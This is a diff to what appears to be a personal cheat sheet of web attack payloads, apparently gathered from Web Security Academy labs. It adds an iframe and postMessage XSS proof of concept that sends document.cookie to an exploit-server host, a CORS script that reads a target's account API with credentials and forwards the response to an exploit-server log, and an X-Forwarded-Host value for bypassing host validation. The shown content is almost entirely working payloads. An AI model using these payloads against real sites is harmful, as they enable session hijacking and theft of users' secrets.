@@ -21,6 +21,12 @@ POC
 ```
 or `document=`, `location.href=`
 
+Another POC
+
+```
+<iframe src="https://0a53000604d36cf7c64505b2004e0010.web-security-academy.net/?search-term=%22%3E%3Cbody%20onmessage=location='https://exploit-0a9300a0041f6c23c61304f4018a0054.exploit-server.net/c='%2bdocument.cookie%3E" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
+
 CMDi in XML format
 
 ```
@@ -112,4 +118,16 @@ Payload
         <email>example1@domain.com</email>
     </user>
 </users>
+```
+
+CORS to get secret information
+
+```
+<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET/account_api/?unixTimestamp=9999999999999999',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a17008a04440aabc099d03601380026.exploit-server.net/log?key='+this.responseText; };</script>
+```
+
+Bypass validate host
+
+```
+X-Forwarded-Host: <exploit-host>?<origin host>
 ```
